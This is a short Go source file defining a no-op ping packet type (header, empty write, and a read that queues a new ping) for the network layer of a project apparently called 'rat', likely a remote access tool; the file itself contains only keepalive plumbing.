package main

import (
	"io"
	"rat/shared/network/header"
)

type PingPacket struct {
}

func (packet PingPacket) Header() header.PacketHeader {
	return header.PingHeader
}

func (packet *PingPacket) Write(io.ReadWriter, *Connection) error {
	return nil
}

func (packet PingPacket) Read(w io.ReadWriter, c *Connection) error {
	c.packets <- &PingPacket{}
	return nil
}
